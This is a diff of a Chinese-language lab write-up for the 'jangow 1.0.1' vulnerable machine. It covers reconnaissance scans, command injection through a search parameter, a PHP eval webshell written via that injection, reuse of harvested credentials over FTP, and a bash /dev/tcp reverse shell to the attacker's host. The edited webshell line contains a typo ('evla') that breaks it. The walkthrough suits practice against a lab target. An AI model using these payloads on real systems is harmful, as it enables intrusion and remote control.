@@ -1,24 +1,25 @@
----
-title: "jangow 1.0.1"
-date: 2026-03-11
-draft: false
-weight: 1
----
++++
+title = "jangow 1.0.1"
+date = 2026-03-11
+draft = false
+weight = 1
+tags = ["命令注入", "一句话木马", "蚁剑", "漏洞利用"]
++++
 
 ## 一、靶机网卡修复
 将靶机网络模式修改为**NAT模式**，按`shift`，选择第二个回车，再选择第二个，按`e`，删除"recovery nomodeset"并在末尾添加"quiet splash rw init=/bin/bash，`ctrl + x`在新的红色界面`sudo vim /etc/network/interfaces`（尽量用tab键补全），将网卡信息修改为`ens33`，这里键盘映射问题，无法直接输入`:wq`，所以先大写，按住`shift`，再双击`Z`，接着重置
 
 
 ## 二、识别靶机ip
-`sudo arp-scan -l`，靶机ip为`192.168.174.129`
+`sudo arp-scan -l`，靶机ip为`192.168.203.136`
 
 ## 三、端口扫描nmap
 快速扫描
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ sudo nmap -sS -sV -sC -T4 192.168.174.129
+└─$ sudo nmap -sS -sV -sC -T4 192.168.203.136
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-28 06:07 EST
-Nmap scan report for 192.168.174.129
+Nmap scan report for 192.168.203.136
 Host is up (0.0035s latency).
 Not shown: 998 filtered tcp ports (no-response)
 PORT   STATE SERVICE VERSION
@@ -51,10 +52,10 @@ Shellcodes: No Results
 ### FTP
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ ftp 192.168.174.129
-Connected to 192.168.174.129.
+└─$ ftp 192.168.203.136
+Connected to 192.168.203.136.
 220 (vsFTPd 3.0.3)
-Name (192.168.174.129:kali): anonymous
+Name (192.168.203.136:kali): anonymous
 331 Please specify the password.
 Password: 
 530 Login incorrect.
@@ -69,11 +70,11 @@ ftp> quit
 ### nikto
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ nikto -h http://192.168.174.129
+└─$ nikto -h http://192.168.203.136
 - Nikto v2.5.0
 ---------------------------------------------------------------------------
-+ Target IP:          192.168.174.129
-+ Target Hostname:    192.168.174.129
++ Target IP:          192.168.203.136
++ Target Hostname:    192.168.203.136
 + Target Port:        80
 + Start Time:         2026-01-29 03:33:55 (GMT-5)
 ---------------------------------------------------------------------------
@@ -102,11 +103,11 @@ ftp> quit
 + 1 host(s) tested
 
 ┌──(kali㉿kali)-[~]
-└─$ nikto -h http://192.168.174.129/site/
+└─$ nikto -h http://192.168.203.136/site/
 - Nikto v2.5.0
 ---------------------------------------------------------------------------
-+ Target IP:          192.168.174.129
-+ Target Hostname:    192.168.174.129
++ Target IP:          192.168.203.136
++ Target Hostname:    192.168.203.136
 + Target Port:        80
 + Start Time:         2026-01-29 03:39:13 (GMT-5)
 ---------------------------------------------------------------------------
@@ -129,7 +130,7 @@ ftp> quit
 ### 目录扫描dirb
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ dirb http://192.168.174.129
+└─$ dirb http://192.168.203.136
 
 WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
@@ -137,31 +138,31 @@ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
                                                                              GENERATED WORDS: 4612
 
----- Scanning URL: http://192.168.174.129/ ----
-                                                                             + http://192.168.174.129/server-status (CODE:403|SIZE:280)                  
-                                                                             ==> DIRECTORY: http://192.168.174.129/site/
+---- Scanning URL: http://192.168.203.136/ ----
+                                                                             + http://192.168.203.136/server-status (CODE:403|SIZE:280)                  
+                                                                             ==> DIRECTORY: http://192.168.203.136/site/
                                                                             
----- Entering directory: http://192.168.174.129/site/ ----
-                                                                                                                                                          ==> DIRECTORY: http://192.168.174.129/site/assets/
-                                                                             ==> DIRECTORY: http://192.168.174.129/site/css/
-+ http://192.168.174.129/site/index.html (CODE:200|SIZE:10190)              
-                                                                             ==> DIRECTORY: http://192.168.174.129/site/js/
-                                                                             ==> DIRECTORY: http://192.168.174.129/site/wordpress/
+---- Entering directory: http://192.168.203.136/site/ ----
+                                                                                                                                                          ==> DIRECTORY: http://192.168.203.136/site/assets/
+                                                                             ==> DIRECTORY: http://192.168.203.136/site/css/
++ http://192.168.203.136/site/index.html (CODE:200|SIZE:10190)              
+                                                                             ==> DIRECTORY: http://192.168.203.136/site/js/
+                                                                             ==> DIRECTORY: http://192.168.203.136/site/wordpress/
                                                                             
----- Entering directory: http://192.168.174.129/site/assets/ ----
+---- Entering directory: http://192.168.203.136/site/assets/ ----
                                                                              (!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
                                                                             
----- Entering directory: http://192.168.174.129/site/css/ ----
+---- Entering directory: http://192.168.203.136/site/css/ ----
                                                                              (!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
                                                                             
----- Entering directory: http://192.168.174.129/site/js/ ----
+---- Entering directory: http://192.168.203.136/site/js/ ----
                                                                              (!) WARNING: Directory IS LISTABLE. No need to scan it.
     (Use mode '-w' if you want to scan it anyway)
                                                                             
----- Entering directory: http://192.168.174.129/site/wordpress/ ----
-                                                                             + http://192.168.174.129/site/wordpress/index.html (CODE:200|SIZE:10190)    
+---- Entering directory: http://192.168.203.136/site/wordpress/ ----
+                                                                             + http://192.168.203.136/site/wordpress/index.html (CODE:200|SIZE:10190)    
                                                                                
 -----------------
 END_TIME: Wed Jan 28 06:16:22 2026
@@ -172,7 +173,7 @@ DOWNLOADED: 13836 - FOUND: 3
 ### wpscan
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ wpscan --url http://192.168.174.129/site/wordpress -e u,p
+└─$ wpscan --url http://192.168.203.136/site/wordpress -e u,p
 _______________________________________________________________
          __          _______   _____
          \ \        / /  __ \ / ____|
@@ -195,12 +196,12 @@ Scan Aborted: The remote website is up, but does not seem to be running WordPres
 ### gobuster
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ gobuster dir -u http://192.168.174.129 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.js,.sh,.txt
+└─$ gobuster dir -u http://192.168.203.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.js,.sh,.txt
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
-[+] Url:                     http://192.168.174.129
+[+] Url:                     http://192.168.203.136
 [+] Method:                  GET
 [+] Threads:                 10
 [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
@@ -211,7 +212,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in directory enumeration mode
 ===============================================================
-/site                 (Status: 301) [Size: 317] [--> http://192.168.174.129/site/]                                                                        
+/site                 (Status: 301) [Size: 317] [--> http://192.168.203.136/site/]                                                                        
 /server-status        (Status: 403) [Size: 280]
 Progress: 1323348 / 1323348 (100.00%)
 ===============================================================
@@ -221,24 +222,25 @@ Finished
 也没有有价值的信息
 
 ### 网页URL
-点击buscar后，提示：`http://192.168.174.129/site/busque.php?buscar=`，可能是本地包含漏洞、命令执行？
+点击buscar后，提示：`http://192.168.203.136/site/busque.php?buscar=`，可能是本地包含漏洞、命令执行？
 本地包含漏洞检测：
+
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ curl http://192.168.174.129/site/busque.php?buscar=../../../../../../etc/passwd
+└─$ curl http://192.168.203.136/site/busque.php?buscar=../../../../../../etc/passwd
 ```
 没有返回内容
 
 命令执行检测：
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ curl http://192.168.174.129/site/busque.php?buscar=id
+└─$ curl http://192.168.203.136/site/busque.php?buscar=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 结果把传的id带回来了，说明没有对传入参数进行限制，因此这里试试传一句话木马
-`http://192.168.174.129/site/busque.php?buscar=echo '<?php eval($_POST["cmd"]); ?>' > shell.php`
+`http://192.168.203.136/site/busque.php?buscar=echo%20%27%3C?php%20evla($_POST[%22cmd%22])%20?%3E%27%20%3E%20shell.php`
 接着ls查看是否成功传入`shell.php`
-`http://192.168.174.129/site/busque.php?buscar=ls`
+`http://192.168.203.136/site/busque.php?buscar=ls`
 接着用蚁剑连接，连接成功，开始翻垃圾
 
 `/var/www/html/site/wordpress/config.php`中找到神秘内容
@@ -260,10 +262,10 @@ $password = "abygurl69";
 使用`.backup`中账户密码，登场登录
 ```ZSH
 ┌──(kali㉿kali)-[~]
-└─$ ftp 192.168.174.129
-Connected to 192.168.174.129.
+└─$ ftp 192.168.203.136
+Connected to 192.168.203.136.
 220 (vsFTPd 3.0.3)
-Name (192.168.174.129:kali): jangow01
+Name (192.168.203.136:kali): jangow01
 331 Please specify the password.
 Password: 
 230 Login successful.
@@ -277,11 +279,12 @@ kali中开启监听，用443端口，因为靶机只能用443（不理解）
 `nc -lvvp 443`
 
 接着去蚁剑打开靶机终端
-`bash -c 'bash -i >& /dev/tcp/192.168.174.131/443 0>&1'`
+`bash -c 'bash -i >& /dev/tcp/192.168.203.129/443 0>&1'`
+
   - `bash -c`告诉bash解释器执行后面引号里的字符串命令
   - `bash -i`启动一个交互式的bash窗口
   - `>&`是重定向组合符，将标准输出和标准错误都发送到同一个地方
-  - `/dev/tcp/192.168.174.131/443`不代表硬盘上的文件，而是尝试与ip为`192.168.174.131`的443端口建立一个tcp网络连接
+  - `/dev/tcp/192.168.203.129/443`不代表硬盘上的文件，而是尝试与ip为`192.168.203.129`的443端口建立一个tcp网络连接
   - `0>&1`是双向绑定，`0`代表标准输入，`1`代表标准输出，将我的输入也绑定到网络连接上，这样从kali发送的指令，目标机能接收并执行
   - 注（这里的ip地址是kali的地址，蚁剑进入的是靶机的端口，反弹shell）
 
@@ -290,8 +293,8 @@ kali中开启监听，用443端口，因为靶机只能用443（不理解）
 ┌──(kali㉿kali)-[~]
 └─$ nc -lvvp 443
 listening on [any] 443 ...
-192.168.174.129: inverse host lookup failed: Unknown host
-connect to [192.168.174.131] from (UNKNOWN) [192.168.174.129] 52824
+192.168.203.136: inverse host lookup failed: Unknown host
+connect to [192.168.203.129] from (UNKNOWN) [192.168.203.136] 52824
 bash: cannot set terminal process group (3862): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@jangow01:/var/www/html/site$ 
